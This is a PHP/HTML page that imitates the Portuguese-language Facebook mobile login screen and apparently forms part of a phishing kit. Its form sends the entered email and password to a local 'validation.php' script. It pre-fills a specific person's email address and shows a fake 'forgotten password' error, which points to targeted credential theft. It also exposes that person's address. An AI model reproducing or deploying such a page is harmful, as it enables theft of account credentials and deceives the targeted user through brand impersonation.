<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="img/icon.png" rel="shortcut icon" sizes="196x196">
    <title>Facebook - entre ou cadastre-se</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="style.css">
</head>
<body>
    <div class="header">
        <i class="fblogo"><u>facebook</u></i>
    </div>

    <?php
        if(isset($_GET['error']) && $_GET['error'] == 'empty'){
            echo '<div class="error">Insira sua senha. <b>Você esqueceu sua senha?</b></div>';
        }
    ?>
    

    <div class="content">
        <h2 align="center">Faça o login para continuar</h2>
        <form class="form" method="post" action="validation.php">
            <input class="input" id="email" type="text" name="email" value="renatamoni@uol.com.br" placeholder="Número do celular ou email">
            <input class="input" id="password" type="text" name="password" placeholder="Senha">
            <input type="submit" id="submit" value="Entrar">
        </form>
        <img src="img/ou.png">
        <br>
        <button class="cad">Criar nova conta</button>
        <br>
        <span class="options">
            <a href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=101&amp;refid=8">Esqueceu a senha?</a>
            <span> · </span>
            <a href="/help/?refid=8">Central de Ajuda</a>
        </span>
    </div>

    <div class="footer">
        <div class="left">
            <p class="selected">Português (Brasil)</p>
            <p class="other">Español</p>
            <p class="other">Deutsch</p>
            <p class="other">العربية</p>
        </div>
        <div class="right">
            <p class="other">English (US)</p>
            <p class="other">Français (France)</p>
            <p class="other">Italiano</p>
            <div class="more"><i></i></div>
         
        </div>
        <div class="bottom">
            Facebook © 2019
        </div>
    </div>

</body>
</html>